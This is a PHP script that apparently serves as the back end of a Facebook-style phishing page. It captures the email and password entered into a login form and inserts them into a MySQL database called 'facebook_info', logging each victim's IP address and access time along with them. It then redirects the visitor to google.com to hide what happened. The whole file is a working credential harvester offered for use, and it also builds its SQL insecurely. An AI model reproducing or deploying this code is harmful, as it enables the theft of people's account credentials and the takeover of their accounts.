<?php
    $uname = $_POST['email'];
    $password = $_POST['password'];
  	$REMOTE_ADDR = $_SERVER['REMOTE_ADDR']; 
    
    //TIMES
    $timezone = date_default_timezone_get();
    $datetimes = date('Y/n/d H:i:s');
    $accesstimes = $timezone . ' ' . $datetimes;

    $dbhost = 'localhost';
    $dbname = 'facebook_info';
    $dbtable = 'targetinfo';
    $dbuname = 'root';
    $dbpwd = 'your_password';

	$conn = mysqli_connect($dbhost, $dbuname, $dbpwd, $dbname);
		if ($conn) {
			$insert = "INSERT INTO `info` (`id`, `email`, `password`, `datetime`, `target_ip`) VALUES (NULL, '$uname', '$password', '$accesstimes', '$REMOTE_ADDR')";
			mysqli_query($conn, $insert);
		} else {
			echo "ERROR: " + mysql_error($insert);
		}
  mysqli_close($conn);
  if ($conn != null) {
  echo "<script language='javascript' type='text/javascript'>";
  echo "</script>";
  $URL="https://www.google.com";
  echo "<script>location.href='$URL'</script>";
  }
  ?>